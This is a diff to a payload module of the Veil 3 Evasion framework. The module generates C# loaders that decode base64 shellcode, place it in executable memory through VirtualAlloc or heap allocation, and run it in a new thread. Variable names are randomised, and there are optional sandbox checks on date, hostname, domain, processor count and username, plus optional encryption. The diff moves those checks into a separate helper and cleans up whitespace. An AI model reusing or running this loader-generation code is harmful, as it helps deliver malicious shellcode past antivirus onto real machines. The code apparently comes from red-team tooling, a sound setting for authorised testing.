@@ -14,6 +14,7 @@ Updated for Veil 3 by @evan_pena2003
 import base64
 from Tools.Evasion.evasion_common import encryption
 from Tools.Evasion.evasion_common import evasion_helpers
+from Tools.Evasion.evasion_common import gamemaker
 from Tools.Evasion.evasion_common import shellcode_help
 
 
@@ -83,7 +84,7 @@ class PayloadModule:
 
         # get 12 random variables for the API imports
         r = [evasion_helpers.randomString() for x in range(12)]
-        y = [evasion_helpers.randomString() for x in range(17)]        
+        y = [evasion_helpers.randomString() for x in range(17)]
 
         #required syntax at the beginning of any/all payloads
         payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
@@ -93,61 +94,18 @@ class PayloadModule:
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
             payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])
         payload_code += "static void Main() {\n"
-        num_tabs_required += 2 
 
-        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
-
-            RandToday = evasion_helpers.randomString()
-            RandExpire = evasion_helpers.randomString()            
-
-            # Create Payload code
-            payload_code += '\t' * num_tabs_required + 'DateTime {} = DateTime.Today;\n'.format(RandToday)
-            payload_code += '\t' * num_tabs_required + 'DateTime {} = {}.AddDays({});\n'.format(RandExpire, RandToday, self.required_options["EXPIRE_PAYLOAD"][0])
-            payload_code += '\t' * num_tabs_required + 'if ({} < {}) {{\n'.format(RandExpire, RandToday)
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["HOSTNAME"][0].lower() != "x":
-
-            payload_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(self.required_options["HOSTNAME"][0].lower())            
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["DOMAIN"][0].lower() != "x":
-
-            payload_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower() != System.Environment.UserDomainName.ToLower()) {\n'                        
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["PROCESSORS"][0].lower() != "x":
-
-            payload_code += '\t' * num_tabs_required + 'if (System.Environment.ProcessorCount > {}) {{\n'.format(self.required_options["PROCESSORS"][0])
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["USERNAME"][0].lower() != "x":
-
-            rand_user_name = evasion_helpers.randomString()
-            rand_char_name = evasion_helpers.randomString()
-            
-            payload_code += '\t' * num_tabs_required + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
-            payload_code += '\t' * num_tabs_required + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
-            payload_code += '\t' * num_tabs_required + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, self.required_options["USERNAME"][0])            
-
-            # Add a tab for this check
-            num_tabs_required += 1
+        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
+        payload_code = payload_code + payload_code2
+        num_tabs_required += 2
 
         payload_code += '\t' * num_tabs_required + "string %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(\"%s\"));" % (bytearrayName, Shellcode)
 
-        payload_code += "string[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
-        payload_code += "byte[] %s = new byte[chars.Length];\n" %(shellcodeName)
-        payload_code += "for (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n"  %(shellcodeName)
+        payload_code += '\t' * num_tabs_required + "string[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
+        payload_code += '\t' * num_tabs_required + "byte[] %s = new byte[chars.Length];\n" %(shellcodeName)
+        payload_code += '\t' * num_tabs_required + "for (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n"  %(shellcodeName)
 
-        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":        
+        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
 
             payload_code += '\t' * num_tabs_required + "UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" % (funcAddrName, shellcodeName)
             payload_code += '\t' * num_tabs_required + "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" % (shellcodeName, funcAddrName, shellcodeName)
@@ -159,8 +117,8 @@ class PayloadModule:
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
 
             rand_heap = evasion_helpers.randomString()
-            rand_ptr = evasion_helpers.randomString()            
-            rand_var = evasion_helpers.randomString()            
+            rand_ptr = evasion_helpers.randomString()
+            rand_var = evasion_helpers.randomString()
 
             payload_code += '\t' * num_tabs_required + 'UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(rand_heap, bytearrayName)
             payload_code += '\t' * num_tabs_required + 'UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(rand_ptr, rand_heap, bytearrayName)
@@ -172,7 +130,7 @@ class PayloadModule:
 
         while (num_tabs_required != 0):
             payload_code += '\t' * num_tabs_required + '}'
-            num_tabs_required -= 1    
+            num_tabs_required -= 1
 
         if self.required_options["USE_ARYA"][0].lower() == "y":
             payload_code = encryption.arya(payload_code)
